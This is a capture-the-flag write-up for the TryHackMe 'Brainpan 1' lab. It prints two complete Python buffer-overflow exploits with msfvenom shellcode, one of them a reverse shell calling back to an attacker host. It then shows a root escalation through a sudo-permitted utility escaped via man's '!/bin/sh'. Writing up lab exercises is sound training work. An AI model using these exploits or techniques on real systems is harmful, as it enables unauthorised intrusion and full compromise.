# Brainpan 1

https://tryhackme.com/room/brainpan

A simple buffer overflow room. Has a couple of quirks: there are no flags, so this is an honour system, and the buffer overflow binary is provided as a windows binary, despite the machine that you need to exploit being Linux. Though this doesnt make any material difference (well, assuming you have a Windows machine handy).

A scan revealed ports `9999` and `10000`. On `9999`, interactable via `nc`, was a simple terminal-based password interface, presumably the point of overflow to exploit. On `10000` was a website, and nikto quickly revealed a /bin directory that contained `brainpan.exe`.

Bringing this to my windows host and firing it up with Immunity Debugger, I was able to make it crash with a long string generated by `msf-pattern_create -l 800`. Then I used `msf-pattern_offset -l 800 -q <EIP>` to get the offset of **524**, which I confirmed via repeating the operating but checking using immunity/mona with `!mona findmsp -distance 800`.

> At this point, you can check for bad characters using mona byte arrays, but this was a rabbit hole - it seemed to just specify the next four bytes over and over, a repeating pattern that usually (in my limited experience) indicates that only `\x00` is bad.

I used `!mona jmp -r esp -cpb "\x00"` to find a jump esp instruction, and created a windows shellcode sample that would pop calc.exe via: `msfvenom -p windows/exec CMD=calc.exe -b "\x00" -f py`.

The final exploit with this was:

```python
import socket

ip = "192.168.1.17"
port = 9999

offset = 524
overflow = "A" * offset
retn = "\xf3\x12\x17\x31"
padding = "\x90" * 16

buf =  b""
buf += b"\xda\xd7\xd9\x74\x24\xf4\xb8\x3e\xf5\x45\x77\x5b\x29"
buf += b"\xc9\xb1\x31\x83\xeb\xfc\x31\x43\x14\x03\x43\x2a\x17"
buf += b"\xb0\x8b\xba\x55\x3b\x74\x3a\x3a\xb5\x91\x0b\x7a\xa1"
buf += b"\xd2\x3b\x4a\xa1\xb7\xb7\x21\xe7\x23\x4c\x47\x20\x43"
buf += b"\xe5\xe2\x16\x6a\xf6\x5f\x6a\xed\x74\xa2\xbf\xcd\x45"
buf += b"\x6d\xb2\x0c\x82\x90\x3f\x5c\x5b\xde\x92\x71\xe8\xaa"
buf += b"\x2e\xf9\xa2\x3b\x37\x1e\x72\x3d\x16\xb1\x09\x64\xb8"
buf += b"\x33\xde\x1c\xf1\x2b\x03\x18\x4b\xc7\xf7\xd6\x4a\x01"
buf += b"\xc6\x17\xe0\x6c\xe7\xe5\xf8\xa9\xcf\x15\x8f\xc3\x2c"
buf += b"\xab\x88\x17\x4f\x77\x1c\x8c\xf7\xfc\x86\x68\x06\xd0"
buf += b"\x51\xfa\x04\x9d\x16\xa4\x08\x20\xfa\xde\x34\xa9\xfd"
buf += b"\x30\xbd\xe9\xd9\x94\xe6\xaa\x40\x8c\x42\x1c\x7c\xce"
buf += b"\x2d\xc1\xd8\x84\xc3\x16\x51\xc7\x89\xe9\xe7\x7d\xff"
buf += b"\xea\xf7\x7d\xaf\x82\xc6\xf6\x20\xd4\xd6\xdc\x05\x2a"
buf += b"\x9d\x7d\x2f\xa3\x78\x14\x72\xae\x7a\xc2\xb0\xd7\xf8"
buf += b"\xe7\x48\x2c\xe0\x8d\x4d\x68\xa6\x7e\x3f\xe1\x43\x81"
buf += b"\xec\x02\x46\xe2\x73\x91\x0a\xcb\x16\x11\xa8\x13"

buffer = overflow + retn + padding + buf

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(buffer + "\r\n")
    print("Done!")
except:
    print("Could not connect.")
```

This worked and popped calc.

To exploit on the linux machine, I used the following to create a reverse shell payload: `msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.196.76 LPORT=4567 EXITFUNC=thread -b "\x00" -f py`, then exploited via (no change except IP address and shell code):

```python
import socket

ip = "10.10.77.79"
port = 9999

offset = 524
overflow = "A" * offset
retn = "\xf3\x12\x17\x31"
padding = "\x90" * 16

buf =  b""
buf += b"\xda\xd8\xba\xb4\xb7\xc5\xd1\xd9\x74\x24\xf4\x58\x31"
buf += b"\xc9\xb1\x12\x83\xe8\xfc\x31\x50\x13\x03\xe4\xa4\x27"
buf += b"\x24\x35\x10\x50\x24\x66\xe5\xcc\xc1\x8a\x60\x13\xa5"
buf += b"\xec\xbf\x54\x55\xa9\x8f\x6a\x97\xc9\xb9\xed\xde\xa1"
buf += b"\x33\x04\xe5\x7d\x2c\x1a\xe5\x6c\x7b\x93\x04\x3e\xe5"
buf += b"\xf4\x97\x6d\x59\xf7\x9e\x70\x50\x78\xf2\x1a\x05\x56"
buf += b"\x80\xb2\xb1\x87\x49\x20\x2b\x51\x76\xf6\xf8\xe8\x98"
buf += b"\x46\xf5\x27\xda"

buffer = overflow + retn + padding + buf

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(buffer + "\r\n")
    print("Done!")
except:
    print("Could not connect.")
```

Which got me a reverse shell :)

On the machine, `sudo -l` revealed `(root) NOPASSWD: /home/anansi/bin/anansi_util`. When I ran this, it said:

```
Usage: /home/anansi/bin/anansi_util [action]
Where [action] is one of:
  - network
  - proclist
  - manual [command]
```

The first would run ifconfig, but a trivial path exploit didn't work. The other two options failed with terminal errors, that were not fixed until I ran: `export TERM=xterm`.

The second option appeared to run `top`, but also didn't seem exploitable. The final open ran `man`, and I was able to escape this trivially via `!/bin/sh`, which got me a root shell :)
